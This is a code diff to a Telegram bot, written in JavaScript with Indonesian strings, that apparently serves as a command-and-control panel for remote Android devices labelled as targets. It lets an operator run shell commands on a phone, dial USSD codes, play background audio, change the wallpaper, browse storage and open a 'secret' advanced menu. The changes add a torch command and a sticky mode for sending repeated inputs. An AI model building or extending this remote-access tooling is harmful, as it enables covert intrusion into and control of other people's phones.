@@ -223,7 +223,16 @@ const commandsWithArgs = {
     'set_wallpaper': 'Masukkan URL Gambar untuk Wallpaper baru:',
     'dial_number': 'Masukkan Nomor/USSD (cth: *123#):',
     'shell': 'Masukkan perintah Shell/Terminal:',
+    'torch': 'Masukkan status Torch (on/off):',
     'play_sound': 'Masukkan direct URL tautan file mp3 yang ingin diputar di latar belakang:'
+};
+
+// Helper untuk membersihkan state input aktif
+const clearActiveInput = (ctx) => {
+    const chatId = ctx.chat?.id || ctx.message?.chat?.id || ctx.callbackQuery?.message?.chat?.id;
+    if (chatId && activeInput[chatId]) {
+        delete activeInput[chatId];
+    }
 };
 
 // --- RENDER PAGINATION FILE EXPLORER ---
@@ -376,6 +385,7 @@ Format Eksekusi Manual:
     });
 
     bot.start((ctx) => {
+        clearActiveInput(ctx);
         const msg = `⚡ <b>RAC-JS Node Command Center</b> ⚡\n\nSelamat datang di Control Panel. Silakan pilih menu di bawah ini:`;
         ctx.reply(msg, {
             parse_mode: 'HTML',
@@ -386,7 +396,10 @@ Format Eksekusi Manual:
         });
     });
 
-    bot.command('list', async (ctx) => listDevicesToChat(ctx));
+    bot.command('list', async (ctx) => {
+        clearActiveInput(ctx);
+        listDevicesToChat(ctx);
+    });
     bot.action('btn_list', async (ctx) => {
         ctx.answerCbQuery();
         listDevicesToChat(ctx);
@@ -421,6 +434,7 @@ Format Eksekusi Manual:
     };
 
     bot.action('list_devices', async (ctx) => {
+        clearActiveInput(ctx);
         ctx.answerCbQuery().catch(() => { });
         listDevicesToChat(ctx);
     });
@@ -483,6 +497,7 @@ Format Eksekusi Manual:
 
     bot.action(/^select_dev:(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
+        clearActiveInput(ctx);
         lastSelectedDevice = devId;
         ctx.answerCbQuery().catch(() => { });
         devicePaths[devId] = "/storage/emulated/0";
@@ -491,6 +506,7 @@ Format Eksekusi Manual:
 
     bot.action(/^secret_menu:(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
+        clearActiveInput(ctx);
         ctx.answerCbQuery('Membuka Fitur Lanjutan...').catch(() => { });
         sendDeviceMenu(ctx, devId, true);
     });
@@ -507,14 +523,24 @@ Format Eksekusi Manual:
         // Jika perintah butuh argumen dan saat ini kosong, minta input user
         if (commandsWithArgs[cmdName] && !cmdText) {
             activeInput[ctx.chat.id] = { devId, command: cmdName };
-            const cancelBtn = { inline_keyboard: [[{ text: '❌ Batal Memasukkan Input', callback_data: 'cancel_input', style: 'danger' }]] };
-            return ctx.reply(`⌨️ <b>Input Diperlukan:</b>\n${commandsWithArgs[cmdName]}`, { parse_mode: 'HTML', reply_markup: cancelBtn });
+            const cancelBtn = {
+                inline_keyboard: [
+                    [{ text: '🔙 Menu Utama', callback_data: `select_dev:${devId}`, style: 'primary' }],
+                    [{ text: '❌ Batal / Tutup', callback_data: 'cancel_input', style: 'danger' }]
+                ]
+            };
+            return ctx.reply(`⌨️ <b>Mode Interaktif: [${cmdName}]</b>\nTarget: <code>${devId}</code>\n\n${commandsWithArgs[cmdName]}\n\n<i>(Anda bisa mengirim input berkali-kali, tekan Kembali jika sudah selesai)</i>`, { parse_mode: 'HTML', reply_markup: cancelBtn });
         }
 
         // Khusus info volume: tampilkan status dulu, tapi juga siapkan form standby untuk set_volume jika pengguna reply
         if (cmdName === 'get_volume') {
             activeInput[ctx.chat.id] = { devId, command: 'set_volume' };
-            const cancelBtn = { inline_keyboard: [[{ text: '❌ Tutup & Batal Ubah Volume', callback_data: 'cancel_input', style: 'danger' }]] };
+            const cancelBtn = {
+                inline_keyboard: [
+                    [{ text: '🔙 Menu Utama', callback_data: `select_dev:${devId}`, style: 'primary' }],
+                    [{ text: '❌ Batal / Tutup', callback_data: 'cancel_input', style: 'danger' }]
+                ]
+            };
             ctx.reply(`💡 Untuk **mengubah** volume HP target, balas pesan ini dengan format <code>[tipe] [angka]</code>\nContoh: \n<code>music 5</code>\n<code>ring 7</code>\n<code>alarm 10</code>\n<code>notification 5</code>\n\n*(Abaikan jika Anda cuma mau melihat info)*`, { parse_mode: 'HTML', reply_markup: cancelBtn }).catch(() => { });
         }
 
@@ -581,10 +607,7 @@ Format Eksekusi Manual:
     });
 
     bot.action('cancel_input', async (ctx) => {
-        const chatId = ctx.callbackQuery.message.chat.id;
-        if (activeInput[chatId]) {
-            delete activeInput[chatId];
-        }
+        clearActiveInput(ctx);
         ctx.answerCbQuery('Input Dibatalkan ❌', { show_alert: true }).catch(() => { });
         // Hapus pesan prompt input nya agar chatting bersih
         try { await ctx.deleteMessage(); } catch (e) { }
@@ -595,12 +618,22 @@ Format Eksekusi Manual:
         const chatId = ctx.chat.id;
         const state = activeInput[chatId];
 
+        // Jika pesan diawali dengan '/' maka itu adalah command bot, biarkan diproses handler command
+        if (ctx.message.text.startsWith('/')) return next();
+
         if (state) {
             const { devId, command } = state;
-            delete activeInput[chatId];
+            // NOTE: activeInput[chatId] TIDAK di-delete agar user bisa kirim input berkali-kali (Mode Lengket)
 
             const cmdId = uuidv4().slice(0, 8);
-            const sentMsg = await ctx.reply(`⏳ <b>[${command}]</b> dikirim ke <code>${devId}</code> dengan input: <i>${escapeHTML(ctx.message.text)}</i>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });
+            const exitBtn = Markup.inlineKeyboard([
+                [Markup.button.callback('🔙 Selesai & Kembali ke Menu', `select_dev:${devId}`)]
+            ]);
+
+            const sentMsg = await ctx.reply(`⏳ <b>[${command}]</b> dikirim ke <code>${devId}</code>...\nInput: <code>${escapeHTML(ctx.message.text)}</code>\n<i>Menunggu Respon...</i>`, {
+                parse_mode: 'HTML',
+                reply_markup: exitBtn.reply_markup
+            });
 
             const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
             const currentMode = device?.polling_mode || 'normal';
